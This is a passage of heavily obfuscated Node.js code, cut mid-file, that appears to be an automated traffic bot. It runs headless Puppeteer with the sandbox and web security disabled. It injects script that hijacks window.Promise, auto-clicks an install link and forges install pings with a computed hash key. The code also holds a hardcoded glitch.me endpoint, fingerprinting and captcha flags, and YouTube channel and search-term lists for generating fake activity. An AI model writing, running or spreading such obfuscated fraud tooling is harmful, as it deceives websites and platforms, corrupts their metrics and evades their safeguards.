-0x15c8 + 0x19b2 | 0x1ad7 + 0x1481 + 0xfb3 * -0x3 & L) << y[0x1 * -0xa1 + 0xbf2 + -0xb4e & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x2464 * -0x1 + -0x25a1 + 0x17d ? (this['block'] = P[-0x772 + 0x5 * 0x256 + 0x216 * -0x2], this['start'] = N - (-0x1281 + -0x1d3 * 0xd + 0xc * 0x38a), this['hash'](), this['hashed'] = -0xc52 + -0x26a3 + 0x32f6) : this['start'] = N;
                }
                return this['bytes'] > -0x189eb5d7f + 0xc5e367ff + 0x1c407f57f && (this['hBytes'] += this['bytes'] / (0x1086f4f04 + -0xc * -0x299a5751 + -0x1fbab66d0) << -0x1 * 0x1d1b + -0x1 * 0x17bb + 0x34d6, this['bytes'] = this['bytes'] % (-0x55ceb330 + 0x1992ec24 * 0x5 + 0xd5f0167c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1d15 + 0xd * 0x67 + 0x1 * -0x224f;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x268d + 0xb6f * -0x1 + 0x320c] = this['block'], J[K >> -0x5cd * -0x5 + 0x2 * 0x490 + -0x261f] |= x[-0x1ec4 + 0x896 + 0x1631 & K], this['block'] = J[-0x73e + -0x7 * -0x1e7 + -0x603], K >= 0x8ff + 0x1687 + 0xfa7 * -0x2 && (this['hashed'] || this['hash'](), J[-0x1 * 0x18f3 + 0x2 * -0x61d + 0x252d] = this['block'], J[-0x1ac5 + 0x20b + 0x18ca] = J[0x25e * 0xb + 0x9a4 * 0x3 + -0x36f5] = J[0x314 + -0x3 * -0x652 + -0x1608] = J[-0x26af + -0x20f + -0x1 * -0x28c1] = J[-0x5 * 0x749 + -0x230b + 0x477c] = J[0x1276 + -0x2244 + 0x1 * 0xfd3] = J[0x4eb * 0x2 + 0x641 + -0x1011] = J[0x1bb * 0x1 + 0x1 * 0x1fb0 + -0x2164 * 0x1] = J[-0x13bb * 0x1 + 0x2491 + -0x10ce] = J[-0x13 * -0x207 + 0x1109 * 0x1 + 0xe9 * -0x3d] = J[-0x2422 + 0x269 * -0x5 + 0x3039] = J[0xe20 * -0x1 + 0xc9a * 0x2 + 0x235 * -0x5] = J[0x1725 + 0x439 + -0x1b52] = J[0x19c7 + 0x1eaf + -0x3869] = J[-0x9bf + 0xf * 0x76 + 0x2e3] = J[-0x1 * 0x1e1f + 0x246 + 0x1be8] = 0xb7a + -0x2 * -0x592 + -0x169e), J[-0x822 + 0x55 * -0x6f + 0x2d0b] = this['hBytes'] << 0x5cb + 0x8ad * -0x2 + 0xb92 * 0x1 | this['bytes'] >>> -0x3e9 + -0x303 * -0xa + 0xa * -0x29c, J[-0x480 + 0x13d * -0xf + -0x1722 * -0x1] = this['bytes'] << -0x1aa6 + 0x899 + 0x1210 * 0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x207 * -0x3 + 0x1c38 + 0x1 * -0x1613; J < -0x1163 + 0x1cac + -0xaf9; ++J)
                K = Q[J - (0x1d65 * -0x1 + 0x173b + 0x62d)] ^ Q[J - (-0x54 * 0x12 + -0x829 * -0x2 + 0x376 * -0x3)] ^ Q[J - (0x14f5 * 0x1 + -0x10e9 + 0xe * -0x49)] ^ Q[J - (0x57a * -0x1 + -0x15e * 0x19 + 0x27b8)], Q[J] = K << -0x1 * -0x1ebc + -0x27b * -0x9 + -0x350e | K >>> 0xf36 + -0xe * -0x42 + 0x12b3 * -0x1;
              for (J = 0x1 * -0x6d9 + -0x4f * 0x3d + -0x4 * -0x66b; J < -0x9b * 0x4 + -0x1 * -0x6dd + -0x45d; J += -0xd48 * -0x2 + -0x54e + -0x1 * 0x153d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x18df + 0x1a9f + -0x3379 | L >>> 0x1901 + -0x572 * 0x2 + -0xe02) + (M & N | ~M & O) + P + (-0x301f0c80 + -0xf961bb5 + 0x9a37a1ce) + Q[J] << -0x1 * 0x1445 + -0x25ea + 0x3a2f) << 0x65 * 0x43 + 0x19 * -0x7f + 0xd3 * -0x11 | P >>> 0x1 * 0x156d + 0x2a * -0xb0 + 0x78e) + (L & (M = M << 0x7e4 + 0x19 * 0x1e + -0xab4 | M >>> 0x130 + -0xc * 0x40 + 0x1d2) | ~L & N) + O + (-0x14a19d * 0x22b + -0x1 * 0x2bc9be5f + 0x19933a31 * 0x7) + Q[J + (-0x1c00 + 0x24d7 + 0x179 * -0x6)] << -0xd69 + 0x87b + -0x4ee * -0x1) << -0x26ea + 0x43 * 0x8d + 0x208 | O >>> 0x20fd + -0x38 * 0x8 + 0xa * -0x31d) + (P & (L = L << 0x751 * -0x2 + -0xc1e * 0x2 + 0x2 * 0x137e | L >>> 0xc0e + 0xd8f + -0x159 * 0x13) | ~P & M) + N + (0x238e9211 * 0x2 + 0x9e32b833 + -0x8acd62bc) + Q[J + (-0x1 * 0x25d9 + 0x13 * -0x1fd + 0x4ba2)] << -0x1033 + -0x12f * 0x1b + 0x3028) << -0x1827 + 0x1346 + 0x4e6 | N >>> 0xc98 + 0x11b2 + -0x1e2f) + (O & (P = P << -0x6ff + -0xb5d * -0x2 + -0xf9d | P >>> 0x1 * 0x219c + -0x1ca6 + 0x4f4 * -0x1) | ~O & L) + M + (-0x7 * 0x72ded75 + 0x7b * -0x16af19d + 0x13b260e3b * 0x1) + Q[J + (-0x1206 + -0xe95 + -0x343 * -0xa)] << 0x1063 + 0x2034 + -0x3097) << -0x3 * 0xd03 + 0x22f2 * -0x1 + -0x2 * -0x2500 | M >>> 0x52b * -0x1 + 0x15f1 * -0x1 + 0x1b37) + (N & (O = O << -0x1 * -0x2056 + 0x23eb + -0x4423 | O >>> 0x2103 + 0x3 * -0x51 + -0x200e) | ~N & P) + L + (-0x73f4ec24 + 0x1ebc010a + -0x331063 * -0x371) + Q[J + (0x472 + -0x1 * 0x10f + -0x35f)] << -0x1ae0 + 0x25 * -0x35 + -0x7 * -0x4ef, N = N << 0xb2f * -0x1 + -0x157 * -0x17 + 0x2 * -0x9c2 | N >>> 0xaa7 + -0xe * 0xe0 + 0x19b;
              for (; J < 0x8 * 0x4de + 0x1733 + -0x3dfb; J += -0x22b1 + -0xf61 + 0x1 * 0x3217)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x39e * -0x1 + 0x52f + -0x8c8 | L >>> -0x2 * -0x61d + -0xf67 + 0x348) + (M ^ N ^ O) + P + (-0xa98bc93 * -0x7 + 0x17624cf * -0x19 + 0x49365bd3) + Q[J] << 0x7a * 0x41 + 0x607 * 0x1 + -0x2501) << 0x16fc * 0x1 + -0x1cc3 + -0x6a * -0xe | P >>> -0x8 * 0x1a7 + 0x1f49 + -0x11f6) + (L ^ (M = M << 0xf1b * 0x2 + 0x1ee7 + -0x15b * 0x2d | M >>> -0x6 * -0x495 + -0x1227 + -0x955 * 0x1) ^ N) + O + (-0x5cb161c + -0x4854bb70 + 0xbcf9bd2d) + Q[J + (-0x1a5b + 0x1 * -0x36e + 0x1dca)] << -0xe9 * -0x22 + -0x18ac * -0x1 + -0x379e) << 0x1 * 0x22a5 + 0x55e + -0x27fe | O >>> -0x16b6 + -0x8a8 + -0x7 * -0x47f) + (P ^ (L = L << -0x9 * 0x3fb + -0x1 * 0x229f + 0x1 * 0x4690 | L >>> 0xe22 + 0x22d2 + -0xb3 * 0x46) ^ M) + N + (0x607b3fe + 0x1 * 0xb3b84def + -0x4ae6164c) + Q[J + (-0x1d38 + 0x1c13 + 0x127)] << 0x17dc + 0x1505 + 0x2ce1 * -0x1) << -0x130f + -0x2227 + -0x353b * -0x1 | N >>> 0x1200 + -0x22f7 + 0x1112) + (O ^ (P = P << 0x677 + 0xee + -0x747 | P >>> -0x1c9b + -0x1119 + 0x2db6) ^ L) + M + (0x1 * -0x2f8e8c59 + -0x29a29c8 * 0x22 + 0xf6e2048a) + Q[J + (0x19e2 + 0x1 * 0x2303 + 0x1e71 * -0x2)] << 0x6e * -0x16 + 0x1eb7 * 0x1 + 0x1 * -0x1543) << -0x394 + 0x1a37 + -0x486 * 0x5 | M >>> -0x1 * 0x5ae + -0xcb7 * 0x1 + 0x8 * 0x250) + (N ^ (O = O << 0x1 * 0x2239 + -0x9e * -0x1e + -0x349f | O >>> -0x15a * -0x3 + -0x1df3 + 0x19e7) ^ P) + L + (0x7d230e71 + 0xc7b0420e + -0x4098926 * 0x35) + Q[J + (-0x1983 + -0x509 + -0x28c * -0xc)] << -0x1917 + 0x19bd + 0x53 * -0x2, N = N << -0x1a16 + -0x21cb * -0x1 + 0x1d * -0x43 | N >>> -0xe10 + -0x69 + -0x1 * -0xe7b;
              for (; J < -0x1f00 + -0x4ca * 0x2 + 0x28d0; J += 0x633 + -0xf3 * -0x1d + -0x1 * 0x21b5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x11c5 + 0x4 * 0x9a4 + 0x1 * -0x14c6 | L >>> 0x1 * -0x16c9 + -0x19b2 + -0x9 * -0x566) + (M & N | M & O | N & O) + P - (0xa94471a4 + 0xc98bda3f + -0x1 * 0x101ec08bf) + Q[J] << 0x5 * 0x40f + 0x9 * -0x1e2 + -0x359) << -0xce4 + 0x65 * -0x4f + -0x1b2 * -0x1a | P >>> 0x5cb * 0x3 + -0x1a * 0x7b + -0x4c8) + (L & (M = M << -0x1002 + 0x180b + -0x7eb | M >>> -0xbd0 + -0x1 * 0x1fd6 + 0x2ba8) | L & N | M & N) + O - (0x1bceea21 * -0x3 + -0xd972ca0e + 0x19dc3cb95) + Q[J + (-0xb7b * 0x1 + -0x231 + 0xdad)] << 0xc1f + -0x1443 + -0x209 * -0x4) << -0x1e3c + 0x1 * -0xf4f + -0xc * -0x3cc | O >>> -0xeb3 + -0x56d + 0x143b) + (P & (L = L << -0x1 * -0x103d + 0x1b4a + -0x1 * 0x2b69 | L >>> -0x17f + 0x84 + 0xfd) | P & M | L & M) + N - (0x5 * -0x44e93cd + 0xa9ce5ee7 + -0xcb3 * 0x2c936) + Q[J + (-0x854 + -0xa36 * -0x3 + -0x164c)] << 0x24df + 0xcf2 + -0x31d1) << 0x2 * -0x374 + -0x7b8 * -0x5 + -0x1fab | N >>> 0xb2d * -0x1 + 0x1d22 + -0x11da) + (O & (P = P << 0x22f5 * -0x1 + 0xda6 + 0x156d | P >>> 0x1305 + 0x2294 + -0x10d * 0x33) | O & L | P & L) + M - (-0x9b93 * -0xf052 + -0xa25ed833 + 0x81377641) + Q[J + (0xdbe + -0x11 * -0x1cd + 0x8 * -0x58b)] << -0xf72 + 0x131 * -0x8 + 0x18fa) << 0x1 * 0x2d3 + 0x20e + -0x1 * 0x4dc | M >>> 0xf * -0x103 + 0x272 + 0x35 * 0x3e) + (N & (O = O << 0x21f2 + -0x2 * 0x23a + -0x4 * 0x758 | O >>> -0x1ecb + 0xcb9 * 0x3 + -0x75e) | N & P | O & P) + L - (-0x2 * -0x11459ef0 + 0x635ab * 0xf78 + -0x11b527e4) + Q[J + (-0x1e74 + 0x3d * -0x8b + 0xdf * 0x49)] << 0x10e5 + -0xb41 + -0x5a4, N = N << -0x1092 + 0x137e + -0x2ce | N >>> 0x1 * 0xc83 + -0x3bc + -0x8c5;
              for (; J < 0x5e * 0x33 + 0x2 * -0x9b7 + 0x104; J += -0x1 * 0x2093 + -0xcb3 + 0x1 * 0x2d4b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x18d9 + 0x13b8 + -0x2c8c | L >>> 0x2f * 0x26 + -0x57 * 0x1 + 0xd1 * -0x8) + (M ^ N ^ O) + P - (0x5d9f3b93 + -0x3 * -0x1572f04a + 0x22c8ef6d * -0x3) + Q[J] << -0x1b2e + -0x1d90 + -0x1c5f * -0x2) << -0x2582 + -0x5 * -0x798 + 0x1 * -0x71 | P >>> 0x1d46 + 0x1 * 0xee6 + -0x1d * 0x185) + (L ^ (M = M << -0x1ee1 + -0x1c9e + 0x3b9d * 0x1 | M >>> 0x167 * 0xd + -0x3 * 0x7e9 + 0x582) ^ N) + O - (-0x7b4ef46 + 0x2 * -0x12a02e1b + -0xbf5d * -0x83de) + Q[J + (-0xb * -0xc2 + -0x1 * 0x1497 + 0xc42)] << 0x2 * 0x9c1 + 0x13 * -0x159 + 0x619) << 0xd * 0xc7 + 0x5 * -0x6f3 + -0x3b * -0x6b | O >>> 0x1 * 0x779 + -0x1a1e + 0x960 * 0x2) + (P ^ (L = L << -0x2223 + 0xb9f + 0x16a2 | L >>> 0x1c8d + 0xa1b + -0x26a6) ^ M) + N - (0x1e3bcde2 + -0x31991fb + 0x1a7b0243) + Q[J + (-0x188a * 0x1 + -0x160 + 0x19ec)] << -0x161 * 0xb + -0x1 * -0x2489 + 0xa * -0x223) << 0x9ec + -0xbcc + 0x1e5 | N >>> 0x6ab + 0x1bf3 + -0x2283) + (O ^ (P = P << -0x19e * -0xd + -0x4cd + 0x101b * -0x1 | P >>> 0x1 * 0x17e3 + -0x47c * -0x1 + -0x1 * 0x1c5d) ^ L) + M - (-0x72 * -0xae4924 + -0x31daea83 + 0x19db96a5) + Q[J + (-0xea2 + 0x1f33 + -0x108e)] << -0x1fa6 + -0x24f8 + 0x449e) << -0x4 * -0x6b8 + -0x2 * -0x25f + -0x1 * 0x1f99 | M >>> -0x70c + -0x17c5 + 0x1eec) + (N ^ (O = O << 0x193a + -0x1f * 0x1f + 0xb * -0x1f1 | O >>> -0x1a5 * -0x12 + -0x1f19 + -0x5 * -0x4d) ^ P) + L - (0x21885ad9 + 0x22e5ec34 * 0x1 + -0xed108e3) + Q[J + (-0x1cb6 + 0x16d4 + 0x5e6 * 0x1)] << 0x20a1 + 0x2 * 0xfdb + -0x1 * 0x4057, N = N << -0x83 * 0x17 + 0x16f6 * -0x1 + 0x22d9 | N >>> 0x2c2 * -0xd + 0x1e6d * 0x1 + 0x56f;
              this['h0'] = this['h0'] + L << 0x258 + 0x70b + -0x963, this['h1'] = this['h1'] + M << -0x5 * 0x4b5 + -0x1 * -0xc1a + 0xb6f, this['h2'] = this['h2'] + N << 0x2182 + -0x1e29 * 0x1 + -0x359, this['h3'] = this['h3'] + O << -0x1eec + 0x4 * -0x4ef + 0x8 * 0x655, this['h4'] = this['h4'] + P << 0x1d9c + 0x4eb * 0x7 + -0xa9 * 0x61;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x2c * 0x68 + 0x1229 * 0x1 + -0x23ed & -0x1 * -0x1f75 + 0x18dd + -0x3843] + w[J >> 0x111a + -0x1c61 + -0x47 * -0x29 & 0x51 + 0x2 * -0x4ab + 0x914] + w[J >> -0x11b9 + 0x13 * 0x80 + 0x84d & 0x1445 + 0x1894 + -0x2cca] + w[J >> 0x26fc + -0x1 * 0x1e74 + -0x10f * 0x8 & 0x26 * 0x71 + 0x31 * -0x7f + 0x24 * 0x36] + w[J >> -0x10ba + 0x257 * -0xd + 0x2f31 & 0x8 * 0x43a + 0xb * -0x34f + 0x2a4] + w[J >> 0x7 * 0x1f6 + 0x6b9 * 0x1 + 0x1 * -0x146b & -0x1e38 + 0x2b * -0x8a + 0x3575] + w[J >> 0x2 * -0x2b + 0x2232 + -0x21d8 & 0x81b + -0x1c8d + 0x1481] + w[0x1 * 0x18f2 + 0x1924 + -0x3207 & J] + w[K >> -0x16ef + 0x31 * -0x2 + -0x176d * -0x1 & 0x12 * 0x219 + -0x15f2 * -0x1 + 0x3ba5 * -0x1] + w[K >> -0x1783 + -0x2132 + 0x38cd & -0x56 * 0xe + 0x614 + -0x151] + w[K >> 0x23 * 0xfd + -0x1922 + -0x961 & 0x6a0 + 0xf92 + -0x1623] + w[K >> 0x3 * -0x485 + 0x6ad * 0x3 + -0x19a * 0x4 & -0x1c12 + -0x2142 + 0x3d63] + w[K >> 0x6 * 0x387 + 0x785 + -0x1ca3 * 0x1 & -0x389 * -0x3 + 0xa9c * 0x3 + -0x2a60] + w[K >> -0x1 * -0xc39 + 0x24e2 + -0x3113 & 0x428 + -0x921 + 0x508] + w[K >> 0xbc9 + 0x74b * -0x3 + -0x4 * -0x287 & 0x509 * -0x5 + -0x1433 + 0x2d6f] + w[-0xff * -0x23 + 0x1661 + 0x392f * -0x1 & K] + w[L >> -0x1a9 + -0x3 * -0x9a3 + -0x1b24 & 0x79c * 0x4 + -0x2503 + 0x6a2] + w[L >> 0x689 + 0x29 * -0x5f + 0x8c6 & 0x124 * 0x19 + 0x16 * 0x14e + -0x3929] + w[L >> -0x1a64 + -0x1 * -0x161a + 0x2 * 0x22f & 0xd8d * -0x1 + 0x12b5 * 0x1 + -0x519] + w[L >> 0xfc8 + -0x25 * 0xec + 0x2 * 0x932 & -0x361 + 0x251a + 0x21aa * -0x1] + w[L >> 0x1efe * 0x1 + -0x1b18 + -0x3a * 0x11 & 0x6c3 * -0x5 + -0x1b64 + -0x2 * -0x1ea1] + w[L >> -0xed * -0x26 + -0xba * 0x21 + -0x37 * 0x34 & 0x1 * 0x24d7 + -0x1 * 0x132d + -0x119b] + w[L >> -0x20fa + 0xa * -0x17a + 0x2fc2 & 0x2 * -0x84d + 0x6 * 0x3ea + -0x6d3] + w[0x2e + 0x5 * 0x378 + -0x1177 & L] + w[M >> 0x228e * 0x1 + 0x69a * -0x4 + -0x80a & -0xe28 + 0x2 * -0x100 + -0x1037 * -0x1] + w[M >> -0x1648 + 0x1 * 0x1096 + 0x5ca & 0x1609 + -0x12f3 + -0x307] + w[M >> -0x1480 + 0x11 * -0x1df + 0x3463 * 0x1 & -0x236c + 0x5 * 0x449 + 0xe0e] + w[M >> 0x2014 + -0x8b3 + -0x7f * 0x2f & 0x4 * 0x90b + 0x4 * -0x35b + 0x1 * -0x16b1] + w[M >> -0x23a * -0xa + 0xf80 + -0x25b8 & -0x1 * 0x1d35 + 0x1d6d + -0x1 * 0x29] + w[M >> -0x25b * -0x7 + -0x914 + -0x761 & 0x19d2 + 0x1508 + 0x533 * -0x9] + w[M >> 0x5b * -0x1b + -0x274 + 0xc11 & -0x1a18 + -0x1 * 0x20af + -0x22 * -0x1bb] + w[-0xc53 + 0x1063 * -0x1 + 0x1cc5 & M] + w[N >> -0x1a * 0xf7 + -0x1096 * -0x1 + 0x89c & 0x332 + -0x23be + -0x1eb * -0x11] + w[N >> -0x291 + -0x269d + -0x1 * -0x2946 & -0x104b + -0x5e * -0x13 + 0x4b0 * 0x2] + w[N >> 0x1 * 0x455 + -0x1ba * -0x10 + -0x1fe1 & -0x23d0 + 0x1f1f + 0x2 * 0x260] + w[N >> -0x2 * 0x1357 + -0x1 * 0x1ea1 + 0x455f & 0x1241 + 0x1bd4 + 0x89 * -0x56] + w[N >> -0x1ff3 * -0x1 + 0xfa1 + 0x1d4 * -0x1a & -0x283 * -0xc + -0x5a0 + -0x1875] + w[N >> -0x12c5 + -0x102c + 0x1 * 0x22f9 & -0x22eb + 0x1f09 * 0x1 + -0x3f1 * -0x1] + w[N >> -0x116c + 0x1 * 0x1b6b + 0x7 * -0x16d & -0xb6 * -0x3 + 0xa9 * -0xd + 0x682] + w[-0x1151 + -0x350 * -0xb + -0x1310 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x16d0 + 0x1b2e + -0x31e6 & 0xbc9 + 0x16ed * 0x1 + -0x21b7,
                J >> -0xa7 * -0x18 + 0x1 * 0x1e4c + 0x1 * -0x2de4 & 0x2707 * -0x1 + -0x2206 + 0x2a5 * 0x1c,
                J >> -0x26b * 0xe + -0x23af + 0x4591 & 0x1904 + 0x1b41 * 0x1 + -0x3346,
                -0x60 * 0x10 + -0x1f63 + 0x22 * 0x121 & J,
                K >> 0x19d0 + 0x8 * 0x2b + -0x1b10 & 0xe1 + -0x561 + 0x3 * 0x1d5,
                K >> -0x1 * 0x1c56 + -0x1a0e + 0x3674 & -0x6 * -0x2a5 + -0x204 * 0x7 + -0x5 * 0x27,
                K >> -0x363 + -0x22ab + 0x2616 & 0x9e3 * -0x1 + -0x1 * -0x2707 + -0x1c25,
                0x1 * 0x20c1 + 0x1 * 0x37a + 0x52 * -0x6e & K,
                L >> 0x895 + -0x63d * 0x4 + -0x119 * -0xf & -0xd16 + 0x5 * -0x3d9 + -0x6aa * -0x5,
                L >> -0x5 * -0x6e6 + 0x886 + -0x2af4 & 0x898 * 0x2 + -0x1 * 0xd42 + -0x2ef,
                L >> -0x12b8 + 0x124 * 0xd + 0x3ec * 0x1 & 0x1e * -0x7b + 0x13 * -0xd + -0x1 * -0x1060,
                -0x3d * 0x11 + -0x1 * -0x7ed + -0x2e1 & L,
                M >> 0x16e5 + -0x14c * -0x9 + -0x161 * 0x19 & 0x1c57 + -0x3 * 0xc4f + 0x995,
                M >> -0xb73 + -0x75a + -0x1b7 * -0xb & 0x1794 + 0x1a5 * -0x15 + 0xbf4,
                M >> 0x2 * -0x28d + -0x13 * 0x46 + 0x52a * 0x2 & -0x184 * -0x17 + 0x2377 + -0x22aa * 0x2,
                -0x9 * 0x3c7 + -0x1367 * 0x1 + 0x3665 & M,
                N >> -0x1b9b + -0x16 * 0x15b + 0x1 * 0x3985 & 0x1ee6 + -0x1 * -0x2489 + -0x4270,
                N >> 0x38 * 0x66 + -0x1457 + -0x3 * 0xa3 & 0x1 * 0xed7 + -0x771 + -0x667,
                N >> 0xf11 + -0x1c0b * 0x1 + 0xd02 & 0xb * 0x184 + -0x1b * -0xe5 + -0x4 * 0x9f5,
                0xa0a * 0x2 + 0xe55 + -0x216a & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x14f6 + 0x4 * -0x2bd + 0x5a * 0x5b), (K = new DataView(J))['setUint32'](0x2183 + -0x1cb8 + -0x1 * 0x4cb, this['h0']), K['setUint32'](0x1418 * 0x1 + 0x256b + -0x397f, this['h1']), K['setUint32'](-0x2525 * -0x1 + 0xf47 * -0x2 + 0x1 * -0x68f, this['h2']), K['setUint32'](-0xe6 * 0x12 + 0x3 * -0x158 + -0x6 * -0x360, this['h3']), K['setUint32'](-0xf08 + -0xe7f + 0x1d97, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype'][X(0x1d)] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document[Y(0x5, '67yT') + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x6d0 + -0xcac * -0x3 + -0x1f34];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0xa64 + 0x1759 + -0x1 * 0x21bd;
            J[-0xc32 + 0xfad + -0x37b]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1203 + 0x258c + -0x378f] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x3ab + 0x958 + 0xc * -0x79), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x23fb + 0x1a78 + 0x3e72 * -0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x4bb * 0x1 + 0x11ee + -0x757 * 0x1), Promise['resolve'](0x1 * 0x257e + -0x1 * -0x13f3 + -0x8 * 0x72e);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0xba5 + 0x1f56 + -0x2afb * 0x1; j < -0x72f * 0x1 + -0x1476 + 0x1ba6; j++)
    i();
}
const NETWORK_PATIENCE = -0x12e * 0x12 + 0x3171 + 0x30b + (-0x544 * 0x1 + 0x1 * -0x1a63 + -0xe75 * -0x3) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1431 * -0x1 + 0xe9d * -0x1 + -0x22d1 * -0x1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + Z(0x1f) + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x7 * -0x2a7 + 0x4 * -0x82f + -0x23b * -0x17; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1 * 0x261b + 0x1f21 + -0x453c);
    let h = e[f];
    return h;
  }, d(b, c);
}
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 